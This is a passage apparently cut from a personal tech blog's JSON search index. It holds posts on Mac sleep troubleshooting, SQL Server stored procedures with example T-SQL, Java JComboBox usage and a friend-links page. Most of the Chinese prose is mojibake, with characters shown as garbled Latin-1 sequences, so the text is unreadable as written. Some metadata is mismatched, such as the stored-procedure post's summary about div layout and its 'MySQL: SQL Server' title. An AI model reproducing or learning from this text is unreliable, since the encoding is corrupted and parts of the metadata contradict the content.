æ³¨æ„ï¼šBattery Powerç”µæ±  å’Œ AC Powerç”µæºé€‚é…å™¨ä¸‰ä¸ªå‚æ•°å‡è¦ç¬¦åˆsleep\u0026gt;=displaysleep\u0026gt;=disksleepè§„åˆ™ï¼Œå¦åˆ™æ— æ³•æ­£å¸¸è¿›å…¥ä¼‘çœ \nå…¶ä»–å¯¼è‡´æ— æ³•ä¼‘çœ çš„åŸå› åŠè§£å†³åŠæ³• å¯èƒ½ä¸‹è½½äº†æŸäº›è½¯ä»¶ä¼šåœ¨macåˆä¸Šç›–å­è¿˜ä¼šå”¤é†’macä»è€Œé˜»æ­¢ä¼‘çœ ï¼Œè¿™æ—¶å€™æ‰“å¼€æ´»åŠ¨ç›‘è§†å™¨ç„¶åç‚¹èƒ½è€—æŸ¥çœ‹ï¼ŒæŠŠé˜²æ­¢ç¡çœ ä¸­å¦‚æœæœ‰ç¨‹åºæ˜¯â€œæ˜¯â€å°±æ”¹æˆâ€œå¦â€ é‡ç½®SMC å¦‚æœè¿˜ä¸è¡Œï¼Œåœ¨terminalç»ˆç«¯è¾“å…¥pmset -g assertions å¯ä»¥æŸ¥çœ‹æ—¥å¿—ï¼ŒæŸ¥å‡ºæ˜¯ä»€ä¹ˆç¨‹åºå”¤é†’ï¼Œç„¶åå…³é—­ å¦‚ä½•é‡ç½®SMCï¼š ç¬¬ä¸€æ­¥ï¼šMacå…³æœº ç¬¬äºŒæ­¥ï¼šå†…é”®é”®ç›˜æ“ä½œ é€‰ä¸­é”®ç›˜å·¦ä¾§çš„Shifté”®ã€Controlé”®ã€Option(Alt)é”® åœ¨æŒ‰ä½ä»¥ä¸Šå…¨éƒ¨ä¸‰ä¸ªæŒ‰é”®çš„å‰æä¸‹ï¼ŒæŒ‰ä½ç”µæºæŒ‰é’®ï¼Œä¸”ä¿æŒ10ç§’ ç¬¬ä¸‰æ­¥ï¼šæ¾å¼€æ‰€æœ‰æŒ‰é”®ï¼Œç„¶åæŒ‰ä¸‹ç”µæºæŒ‰é”®å°†Macå¼€æœºã€‚ äºŒã€è½¯ä»¶ç³»ç»Ÿ 1.ç³»ç»Ÿç‰ˆæœ¬å‡çº§ å®˜æ–¹æ–‡æ¡£-high Sierra\nç³»ç»Ÿç‰ˆæœ¬å‡çº§\næ£€æŸ¥ç¡¬ä»¶å’Œç³»ç»Ÿç‰ˆæœ¬å…¼å®¹æ€§\n2.ç³»ç»Ÿé™çº§ macOS é‡è£…ç³»ç»Ÿ Mojave | é™çº§mac OS\næœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/other/mac-system-env-config/","summary":"\u003cp\u003eä½¿ç”¨Macè¿‡ç¨‹ä¸­é‡åˆ°çš„ä¸€äº›é—®é¢˜è®°å½•\u0026hellip;\u003c/p\u003e","title":"Macç³»ç»Ÿ/è½¯ä»¶ç‰ˆæœ¬é…ç½®é—®é¢˜æ±‡æ€»"},{"content":"é¡¹ç›®å¼€å‘ä¸­ï¼Œç»å¸¸é‡åˆ°divå…ƒç´ è‡ªé€‚åº”ç­‰é«˜çš„é—®é¢˜ï¼Œæœ€è¿‘ç®€å•çš„åšäº†ä¸€äº›æ€»ç»“\u0026hellip;\nå­˜å‚¨è¿‡ç¨‹ï¼Œéå¸¸ç±»ä¼¼äºJavaä¸­çš„æ–¹æ³•ï¼Œå®ƒå¯ä»¥é‡å¤è°ƒç”¨ã€‚å½“å­˜å‚¨è¿‡ç¨‹æ‰§è¡Œä¸€æ¬¡åï¼Œå¯ä»¥å°†è¯­å¥ç¼“å­˜ä¸­ï¼Œè¿™æ ·ä¸‹æ¬¡æ‰§è¡Œçš„æ—¶å€™ç›´æ¥ä½¿ç”¨ç¼“å­˜ä¸­çš„è¯­å¥ã€‚è¿™æ ·å°±å¯ä»¥æé«˜å­˜å‚¨è¿‡ç¨‹çš„æ€§èƒ½ã€‚\nå­˜å‚¨è¿‡ç¨‹çš„æ¦‚å¿µ\nå­˜å‚¨è¿‡ç¨‹Procedureæ˜¯ä¸€ç»„ä¸ºäº†å®Œæˆç‰¹å®šåŠŸèƒ½çš„SQLè¯­å¥é›†åˆï¼Œç»ç¼–è¯‘åå­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œç”¨æˆ·é€šè¿‡æŒ‡å®šå­˜å‚¨è¿‡ç¨‹çš„åç§°å¹¶ç»™å‡ºå‚æ•°æ¥æ‰§è¡Œã€‚ å­˜å‚¨è¿‡ç¨‹ä¸­å¯ä»¥åŒ…å«é€»è¾‘æ§åˆ¶è¯­å¥å’Œæ•°æ®æ“çºµè¯­å¥ï¼Œå®ƒå¯ä»¥æ¥å—å‚æ•°ã€è¾“å‡ºå‚æ•°ã€è¿”å›å•ä¸ªæˆ–å¤šä¸ªç»“æœé›†ä»¥åŠè¿”å›å€¼ã€‚ ç”±äºå­˜å‚¨è¿‡ç¨‹åœ¨åˆ›å»ºæ—¶å³åœ¨æ•°æ®åº“æœåŠ¡å™¨ä¸Šè¿›è¡Œäº†ç¼–è¯‘å¹¶å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œæ‰€ä»¥å­˜å‚¨è¿‡ç¨‹è¿è¡Œè¦æ¯”å•ä¸ªçš„SQLè¯­å¥å—è¦å¿«ã€‚åŒæ—¶ç”±äºåœ¨è°ƒç”¨æ—¶åªéœ€ç”¨æä¾›å­˜å‚¨è¿‡ç¨‹åå’Œå¿…è¦çš„å‚æ•°ä¿¡æ¯ï¼Œæ‰€ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šä¹Ÿå¯ä»¥å‡å°‘ç½‘ç»œæµé‡ã€ç®€å•ç½‘ç»œè´Ÿæ‹…ã€‚ 1ã€ å­˜å‚¨è¿‡ç¨‹çš„ä¼˜ç‚¹ Aã€ å­˜å‚¨è¿‡ç¨‹å…è®¸æ ‡å‡†ç»„ä»¶å¼ç¼–ç¨‹ å­˜å‚¨è¿‡ç¨‹åˆ›å»ºåå¯ä»¥åœ¨ç¨‹åºä¸­è¢«å¤šæ¬¡è°ƒç”¨æ‰§è¡Œï¼Œè€Œä¸å¿…é‡æ–°ç¼–å†™è¯¥å­˜å‚¨è¿‡ç¨‹çš„SQLè¯­å¥ã€‚è€Œä¸”æ•°æ®åº“ä¸“ä¸šäººå‘˜å¯ä»¥éšæ—¶å¯¹å­˜å‚¨è¿‡ç¨‹è¿›è¡Œä¿®æ”¹ï¼Œä½†å¯¹åº”ç”¨ç¨‹åºæºä»£ç å´æ¯«æ— å½±å“ï¼Œä»è€Œæå¤§çš„æé«˜äº†ç¨‹åºçš„å¯ç§»æ¤æ€§ã€‚ Bã€ å­˜å‚¨è¿‡ç¨‹èƒ½å¤Ÿå®ç°è¾ƒå¿«çš„æ‰§è¡Œé€Ÿåº¦ å¦‚æœæŸä¸€æ“ä½œåŒ…å«å¤§é‡çš„T-SQLè¯­å¥ä»£ç ï¼Œåˆ†åˆ«è¢«å¤šæ¬¡æ‰§è¡Œï¼Œé‚£ä¹ˆå­˜å‚¨è¿‡ç¨‹è¦æ¯”æ‰¹å¤„ç†çš„æ‰§è¡Œé€Ÿåº¦å¿«å¾—å¤šã€‚å› ä¸ºå­˜å‚¨è¿‡ç¨‹æ˜¯é¢„ç¼–è¯‘çš„ï¼Œåœ¨é¦–æ¬¡è¿è¡Œä¸€ä¸ªå­˜å‚¨è¿‡ç¨‹æ—¶ï¼ŒæŸ¥è¯¢ä¼˜åŒ–å™¨å¯¹å…¶è¿›è¡Œåˆ†æã€ä¼˜åŒ–ï¼Œå¹¶ç»™å‡ºæœ€ç»ˆè¢«å­˜åœ¨ç³»ç»Ÿè¡¨ä¸­çš„å­˜å‚¨è®¡åˆ’ã€‚è€Œæ‰¹å¤„ç†çš„T-SQLè¯­å¥æ¯æ¬¡è¿è¡Œéƒ½éœ€è¦é¢„ç¼–è¯‘å’Œä¼˜åŒ–ï¼Œæ‰€ä»¥é€Ÿåº¦å°±è¦æ…¢ä¸€äº›ã€‚ Cã€ å­˜å‚¨è¿‡ç¨‹å‡è½»ç½‘ç»œæµé‡ å¯¹äºåŒä¸€ä¸ªé’ˆå¯¹æ•°æ®åº“å¯¹è±¡çš„æ“ä½œï¼Œå¦‚æœè¿™ä¸€æ“ä½œæ‰€æ¶‰åŠåˆ°çš„T-SQLè¯­å¥è¢«ç»„ç»‡æˆä¸€å­˜å‚¨è¿‡ç¨‹ï¼Œé‚£ä¹ˆå½“åœ¨å®¢æˆ·æœºä¸Šè°ƒç”¨è¯¥å­˜å‚¨è¿‡ç¨‹æ—¶ï¼Œç½‘ç»œä¸­ä¼ é€’çš„åªæ˜¯è¯¥è°ƒç”¨è¯­å¥ï¼Œå¦åˆ™å°†ä¼šæ˜¯å¤šæ¡SQLè¯­å¥ã€‚ä»è€Œå‡è½»äº†ç½‘ç»œæµé‡ï¼Œé™ä½äº†ç½‘ç»œè´Ÿè½½ã€‚ Dã€ å­˜å‚¨è¿‡ç¨‹å¯è¢«ä½œä¸ºä¸€ç§å®‰å…¨æœºåˆ¶æ¥å……åˆ†åˆ©ç”¨ ç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥å¯¹æ‰§è¡Œçš„æŸä¸€ä¸ªå­˜å‚¨è¿‡ç¨‹è¿›è¡Œæƒé™é™åˆ¶ï¼Œä»è€Œèƒ½å¤Ÿå®ç°å¯¹æŸäº›æ•°æ®è®¿é—®çš„é™åˆ¶ï¼Œé¿å…éæˆæƒç”¨æˆ·å¯¹æ•°æ®çš„è®¿é—®ï¼Œä¿è¯æ•°æ®çš„å®‰å…¨ã€‚ Ã˜ ç³»ç»Ÿå­˜å‚¨è¿‡ç¨‹\nç³»ç»Ÿå­˜å‚¨è¿‡ç¨‹æ˜¯ç³»ç»Ÿåˆ›å»ºçš„å­˜å‚¨è¿‡ç¨‹ï¼Œç›®çš„åœ¨äºèƒ½å¤Ÿæ–¹ä¾¿çš„ä»ç³»ç»Ÿè¡¨ä¸­æŸ¥è¯¢ä¿¡æ¯æˆ–å®Œæˆä¸æ›´æ–°æ•°æ®åº“è¡¨ç›¸å…³çš„ç®¡ç†ä»»åŠ¡æˆ–å…¶ä»–çš„ç³»ç»Ÿç®¡ç†ä»»åŠ¡ã€‚ç³»ç»Ÿå­˜å‚¨è¿‡ç¨‹ä¸»è¦å­˜å‚¨åœ¨masteræ•°æ®åº“ä¸­ï¼Œä»¥â€œspâ€ä¸‹åˆ’çº¿å¼€å¤´çš„å­˜å‚¨è¿‡ç¨‹ã€‚å°½ç®¡è¿™äº›ç³»ç»Ÿå­˜å‚¨è¿‡ç¨‹åœ¨masteræ•°æ®åº“ä¸­ï¼Œä½†æˆ‘ä»¬åœ¨å…¶ä»–æ•°æ®åº“è¿˜æ˜¯å¯ä»¥è°ƒç”¨ç³»ç»Ÿå­˜å‚¨è¿‡ç¨‹ã€‚æœ‰ä¸€äº›ç³»ç»Ÿå­˜å‚¨è¿‡ç¨‹ä¼šåœ¨åˆ›å»ºæ–°çš„æ•°æ®åº“çš„æ—¶å€™è¢«è‡ªåŠ¨åˆ›å»ºåœ¨å½“å‰æ•°æ®åº“ä¸­ã€‚ å¸¸ç”¨ç³»ç»Ÿå­˜å‚¨è¿‡ç¨‹æœ‰ï¼š exec sp_databases; \u0026ndash;æŸ¥çœ‹æ•°æ®åº“ exec sp_tables; \u0026ndash;æŸ¥çœ‹è¡¨ exec sp_columns student;\u0026ndash;æŸ¥çœ‹åˆ— exec sp_helpIndex student;\u0026ndash;æŸ¥çœ‹ç´¢å¼• exec sp_helpConstraint student;\u0026ndash;çº¦æŸ exec sp_stored_procedures; exec sp_helptext \u0026lsquo;sp_stored_procedures\u0026rsquo;;\u0026ndash;æŸ¥çœ‹å­˜å‚¨è¿‡ç¨‹åˆ›å»ºã€å®šä¹‰è¯­å¥ exec sp_rename student, stuInfo;\u0026ndash;ä¿®æ”¹è¡¨ã€ç´¢å¼•ã€åˆ—çš„åç§° exec sp_renamedb myTempDB, myDB;\u0026ndash;æ›´æ”¹æ•°æ®åº“åç§° exec sp_defaultdb \u0026lsquo;master\u0026rsquo;, \u0026lsquo;myDB\u0026rsquo;;\u0026ndash;æ›´æ”¹ç™»å½•åçš„é»˜è®¤æ•°æ®åº“ exec sp_helpdb;\u0026ndash;æ•°æ®åº“å¸®åŠ©ï¼ŒæŸ¥è¯¢æ•°æ®åº“ä¿¡æ¯ exec sp_helpdb master;\nç³»ç»Ÿå­˜å‚¨è¿‡ç¨‹ç¤ºä¾‹ï¼š \u0026ndash;è¡¨é‡å‘½å exec sp_rename \u0026lsquo;stu\u0026rsquo;, \u0026lsquo;stud\u0026rsquo;; select * from stud; \u0026ndash;åˆ—é‡å‘½å exec sp_rename \u0026lsquo;stud.name\u0026rsquo;, \u0026lsquo;sName\u0026rsquo;, \u0026lsquo;column\u0026rsquo;; exec sp_help \u0026lsquo;stud\u0026rsquo;; \u0026ndash;é‡å‘½åç´¢å¼• exec sp_rename N\u0026rsquo;student.idx_cid\u0026rsquo;, N\u0026rsquo;idx_cidd\u0026rsquo;, N\u0026rsquo;index\u0026rsquo;; exec sp_help \u0026lsquo;student\u0026rsquo;;\n\u0026ndash;æŸ¥è¯¢æ‰€æœ‰å­˜å‚¨è¿‡ç¨‹ select * from sys.objects where type = \u0026lsquo;P\u0026rsquo;; select * from sys.objects where type_desc like \u0026lsquo;%pro%\u0026rsquo; and name like \u0026lsquo;sp%\u0026rsquo;;\nÃ˜ ç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨è¿‡ç¨‹\n1ã€ åˆ›å»ºè¯­æ³•\ncreate proc | procedure pro_name [{@å‚æ•°æ•°æ®ç±»å‹} [=é»˜è®¤å€¼] [output], {@å‚æ•°æ•°æ®ç±»å‹} [=é»˜è®¤å€¼] [output], \u0026hellip;. ] as SQL_statements\n2ã€ åˆ›å»ºä¸å¸¦å‚æ•°å­˜å‚¨è¿‡ç¨‹\n\u0026ndash;åˆ›å»ºå­˜å‚¨è¿‡ç¨‹ if (exists (select * from sys.objects where name = \u0026lsquo;proc_get_student\u0026rsquo;)) drop proc proc_get_student go create proc proc_get_student as select * from student;\n\u0026ndash;è°ƒç”¨ã€æ‰§è¡Œå­˜å‚¨è¿‡ç¨‹ exec proc_get_student;\n3ã€ ä¿®æ”¹å­˜å‚¨è¿‡ç¨‹\n\u0026ndash;ä¿®æ”¹å­˜å‚¨è¿‡ç¨‹ alter proc proc_get_student as select * from student;\n4ã€ å¸¦å‚å­˜å‚¨è¿‡ç¨‹\n\u0026ndash;å¸¦å‚å­˜å‚¨è¿‡ç¨‹ if (object_id(\u0026lsquo;proc_find_stu\u0026rsquo;, \u0026lsquo;P\u0026rsquo;) is not null) drop proc proc_find_stu go create proc proc_find_stu(@startId int, @endId int) as select * from student where id between @startId and @endId go\nexec proc_find_stu 2, 4;\n5ã€ å¸¦é€šé…ç¬¦å‚æ•°å­˜å‚¨è¿‡ç¨‹\n\u0026ndash;å¸¦é€šé…ç¬¦å‚æ•°å­˜å‚¨è¿‡ç¨‹ if (object_id(\u0026lsquo;proc_findStudentByName\u0026rsquo;, \u0026lsquo;P\u0026rsquo;) is not null) drop proc proc_findStudentByName go create proc proc_findStudentByName(@name varchar(20) = \u0026lsquo;%j%\u0026rsquo;, @nextName varchar(20) = \u0026lsquo;%\u0026rsquo;) as select * from student where name like @name and name like @nextName; go\nexec proc_findStudentByName; exec proc_findStudentByName \u0026lsquo;%o%\u0026rsquo;, \u0026rsquo;t%\u0026rsquo;;\n6ã€ å¸¦è¾“å‡ºå‚æ•°å­˜å‚¨è¿‡ç¨‹\nif (object_id(\u0026lsquo;proc_getStudentRecord\u0026rsquo;, \u0026lsquo;P\u0026rsquo;) is not null) drop proc proc_getStudentRecord go create proc proc_getStudentRecord( @id int, \u0026ndash;é»˜è®¤è¾“å…¥å‚æ•° @name varchar(20) out, \u0026ndash;è¾“å‡ºå‚æ•° @age varchar(20) output\u0026ndash;è¾“å…¥è¾“å‡ºå‚æ•° ) as select @name = name, @age = age from student where id = @id and sex = @age; go\n\u0026ndash; declare @id int, @name varchar(20), @temp varchar(20); set @id = 7; set @temp = 1; exec proc_getStudentRecord @id, @name out, @temp output; select @name, @temp; print @name + \u0026lsquo;#\u0026rsquo; + @temp;\n7ã€ ä¸ç¼“å­˜å­˜å‚¨è¿‡ç¨‹\n\u0026ndash;WITH RECOMPILE ä¸ç¼“å­˜ if (object_id(\u0026lsquo;proc_temp\u0026rsquo;, \u0026lsquo;P\u0026rsquo;) is not null) drop proc proc_temp go create proc proc_temp with recompile as select * from student; go\nexec proc_temp;\n8ã€ åŠ å¯†å­˜å‚¨è¿‡ç¨‹\n\u0026ndash;åŠ å¯†WITH ENCRYPTION if (object_id(\u0026lsquo;proc_temp_encryption\u0026rsquo;, \u0026lsquo;P\u0026rsquo;) is not null) drop proc proc_temp_encryption go create proc proc_temp_encryption with encryption as select * from student; go\nexec proc_temp_encryption; exec sp_helptext \u0026lsquo;proc_temp\u0026rsquo;; exec sp_helptext \u0026lsquo;proc_temp_encryption\u0026rsquo;;\n9ã€ å¸¦æ¸¸æ ‡å‚æ•°å­˜å‚¨è¿‡ç¨‹\nif (object_id(\u0026lsquo;proc_cursor\u0026rsquo;, \u0026lsquo;P\u0026rsquo;) is not null) drop proc proc_cursor go create proc proc_cursor @cur cursor varying output as set @cur = cursor forward_only static for select id, name, age from student; open @cur; go \u0026ndash;è°ƒç”¨ declare @exec_cur cursor; declare @id int, @name varchar(20), @age int; exec proc_cursor @cur = @exec_cur output;\u0026ndash;è°ƒç”¨å­˜å‚¨è¿‡ç¨‹ fetch next from @exec_cur into @id, @name, @age; while (@@fetch_status = 0) begin fetch next from @exec_cur into @id, @name, @age; print \u0026lsquo;id: \u0026rsquo; + convert(varchar, @id) + \u0026lsquo;, name: \u0026rsquo; + @name + \u0026lsquo;, age: \u0026rsquo; + convert(char, @age); end close @exec_cur; deallocate @exec_cur;\u0026ndash;åˆ é™¤æ¸¸æ ‡\n10ã€ åˆ†é¡µå­˜å‚¨è¿‡ç¨‹\n\u0026mdash;å­˜å‚¨è¿‡ç¨‹ã€row_numberå®Œæˆåˆ†é¡µ if (object_id(\u0026lsquo;pro_page\u0026rsquo;, \u0026lsquo;P\u0026rsquo;) is not null) drop proc proc_cursor go create proc pro_page @startIndex int, @endIndex int as select count(*) from product ; select * from ( select row_number() over(order by pid) as rowId, * from product ) temp where temp.rowId between @startIndex and @endIndex go \u0026ndash;drop proc pro_page exec pro_page 1, 4 \u0026ndash;åˆ†é¡µå­˜å‚¨è¿‡ç¨‹ if (object_id(\u0026lsquo;pro_page\u0026rsquo;, \u0026lsquo;P\u0026rsquo;) is not null) drop proc pro_stu go create procedure pro_stu( @pageIndex int, @pageSize int ) as declare @startRow int, @endRow int set @startRow = (@pageIndex - 1) * @pageSize +1 set @endRow = @startRow + @pageSize -1 select * from ( select *, row_number() over (order by id asc) as number from student ) t where t.number between @startRow and @endRow;\nexec pro_stu 2, 2;\nÃ˜ Raiserror\nRaiserrorè¿”å›ç”¨æˆ·å®šä¹‰çš„é”™è¯¯ä¿¡æ¯ï¼Œå¯ä»¥æŒ‡å®šä¸¥é‡çº§åˆ«ï¼Œè®¾ç½®ç³»ç»Ÿå˜é‡è®°å½•æ‰€å‘ç”Ÿçš„é”™è¯¯ã€‚\nè¯­æ³•å¦‚ä¸‹ï¼š\nRaiserror({msg_id | msg_str | @local_variable} {, severity, state} [,argument[,â€¦n]] [with option[,â€¦n]] )\nmsg_id:åœ¨sysmessagesç³»ç»Ÿè¡¨ä¸­æŒ‡å®šçš„ç”¨æˆ·å®šä¹‰é”™è¯¯ä¿¡æ¯ msg_str:ç”¨æˆ·å®šä¹‰çš„ä¿¡æ¯ï¼Œä¿¡æ¯æœ€å¤§é•¿åº¦åœ¨2047ä¸ªå­—ç¬¦ã€‚ severityï¼šç”¨æˆ·å®šä¹‰ä¸è¯¥æ¶ˆæ¯å…³è”çš„ä¸¥é‡çº§åˆ«ã€‚å½“ä½¿ç”¨msg_idå¼•å‘ä½¿ç”¨sp_addmessageåˆ›å»ºçš„ç”¨æˆ·å®šä¹‰æ¶ˆæ¯æ—¶ï¼Œraiserrorä¸ŠæŒ‡å®šä¸¥é‡æ€§å°†è¦†ç›–sp_addmessageä¸­å®šä¹‰çš„ä¸¥é‡æ€§ã€‚ ä»»ä½•ç”¨æˆ·å¯ä»¥æŒ‡å®š0-18ç›´æ¥çš„ä¸¥é‡çº§åˆ«ã€‚åªæœ‰sysadminå›ºå®šæœåŠ¡å™¨è§’è‰²å¸¸ç”¨æˆ–å…·æœ‰alter traceæƒé™çš„ç”¨æˆ·æ‰èƒ½æŒ‡å®š19-25ç›´æ¥çš„ä¸¥é‡çº§åˆ«ã€‚19-25ä¹‹é—´çš„å®‰å…¨çº§åˆ«éœ€è¦ä½¿ç”¨with logé€‰é¡¹ã€‚ stateï¼šä»‹äº1è‡³127ç›´æ¥çš„ä»»ä½•æ•´æ•°ã€‚Stateé»˜è®¤å€¼æ˜¯1ã€‚ raiserror(\u0026lsquo;is error\u0026rsquo;, 16, 1); select * from sys.messages; \u0026ndash;ä½¿ç”¨sysmessagesä¸­å®šä¹‰çš„æ¶ˆæ¯ raiserror(33003, 16, 1); raiserror(33006, 16, 1);\næœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\n","permalink":"https://lianpf.github.io/posts/backend-develop/db-sqlserver-storedprocedure/","summary":"\u003cp\u003eé¡¹ç›®å¼€å‘ä¸­ï¼Œç»å¸¸é‡åˆ°divå…ƒç´ è‡ªé€‚åº”ç­‰é«˜çš„é—®é¢˜ï¼Œæœ€è¿‘ç®€å•çš„åšäº†ä¸€äº›æ€»ç»“\u0026hellip;\u003c/p\u003e","title":"MySQL: SQL Server å­˜å‚¨è¿‡ç¨‹"},{"content":"JListå’ŒComboBoxå¾ˆç›¸ä¼¼ï¼Œå› ä¸ºè¿™ä¸¤ä¸ªç»„ä»¶éƒ½æ˜¾ç¤ºä¸€ä¸ªé¡¹åˆ—è¡¨ã€‚å› æ­¤ï¼Œå®ƒä»¬éƒ½æœ‰æ‰©å±•ListModelæ¥å£çš„æ¨¡å‹\u0026hellip;\næ–‡ç« åœ°å€ï¼šhttps://blog.csdn.net/lpf1215/article/details/50771635\næœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/backend-develop/java-gui-use-of-jcombobox/","summary":"\u003cp\u003eJListå’ŒComboBoxå¾ˆç›¸ä¼¼ï¼Œå› ä¸ºè¿™ä¸¤ä¸ªç»„ä»¶éƒ½æ˜¾ç¤ºä¸€ä¸ªé¡¹åˆ—è¡¨ã€‚å› æ­¤ï¼Œå®ƒä»¬éƒ½æœ‰æ‰©å±•ListModelæ¥å£çš„æ¨¡å‹\u0026hellip;\u003c/p\u003e","title":"GUI å…³äºJComboBoxçš„ç”¨æ³•"},{"content":" title: \u0026ldquo;ğŸ¤å‹é“¾\u0026rdquo; layout: links date: 2021-11-06T15:15:53+08:00 description: draft: false hidemeta: true showToc: false disableShare: true comments: true reward: false showbreadcrumbs: false æ›œçµ Blog ä¸€ä¸ªè®°å½•æŠ€æœ¯ã€é˜…è¯»ã€ç”Ÿæ´»çš„åšå®¢ ğŸ‘‰å‹é“¾æ ¼å¼ åç§°ï¼š æ›œçµï¼ˆSUNï¼‰Site ç½‘å€ï¼š https://www.æ›œçµblog.cn å›¾æ ‡ï¼š https://www.æ›œçµblog.cn/img/Q.gif æè¿°ï¼š ä¸€ä¸ªè®°å½•æŠ€æœ¯ã€é˜…è¯»ã€ç”Ÿæ´»çš„åšå®¢ ğŸ‘‰å‹é“¾ç”³è¯·è¦æ±‚ ç§‰æ‰¿äº’æ¢å‹é“¾åŸåˆ™ã€æ–‡ç« å®šæœŸæ›´æ–°ã€ä¸èƒ½æœ‰å¤ªå¤šå¹¿å‘Šã€ä¸ªäººæè¿°å­—æ•°æ§åˆ¶åœ¨15å­—å†…\nğŸ‘‰Hugoåšå®¢äº¤æµç¾¤ 787018782\n","permalink":"https://lianpf.github.io/links/","summary":"title: \u0026ldquo;ğŸ¤å‹é“¾\u0026rdquo; layout: links date: 2021-11-06T15:15:53+08:00 description: draft: false hidemeta: true showToc: false disableShare:","title":""}]